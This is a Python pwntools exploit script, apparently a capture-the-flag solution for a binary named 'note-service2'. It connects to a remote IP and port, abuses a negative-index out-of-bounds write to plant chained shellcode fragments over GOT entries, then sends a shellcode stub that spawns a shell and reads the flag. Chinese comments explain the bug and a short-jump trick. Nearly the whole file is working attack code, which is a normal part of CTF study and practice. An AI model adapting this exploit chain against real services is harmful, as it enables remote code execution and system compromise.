# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './note-service2'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '111.200.241.244'
    port = '51911'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(idx , size , content):
    cmd(1)
    sla('index:',idx)
    sla('size:',size)
    sa('content:' , content)

def delete(idx ):
    cmd(4)
    sla('index:',idx)

# one_gad = one_gadget(libc.path)

# 这题真的太有趣了，首先有个数组越界，可以直接往got表上申请
# 其次这些段全有可执行权限，考虑shellcode
# 最后一个小知识点 jmp 0x19 也是可以使用
# 真的有意思

def attack():
    

    shellcode1 = '''
    push rdi
    pop rsi
    xor edi , edi
    nop
    '''

    shellcode2 = '''
    push 0x99
    '''

    shellcode3 = '''
    xor eax , eax
    pop rdx
    syscall
    '''

    jmp_next = '\xeb\x19'
    
    # jmp 0x19 虽然编译不出来但是居然能用

    add(-0x11 , 8 , asm(shellcode1) + jmp_next)
    add( 0 , 8 , asm(shellcode2) + jmp_next)
    add( 1 , 8 , asm(shellcode3) + '\n')
    # dbg('*$rebase(0x0000000000000E25)')

    delete(-0x11)
    se( '\x90'*0x50 + asm(shellcraft.sh()) )

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   note-service2.py
@Time    :   2021/12/10 22:39:12
@Author  :   Niyah 
'''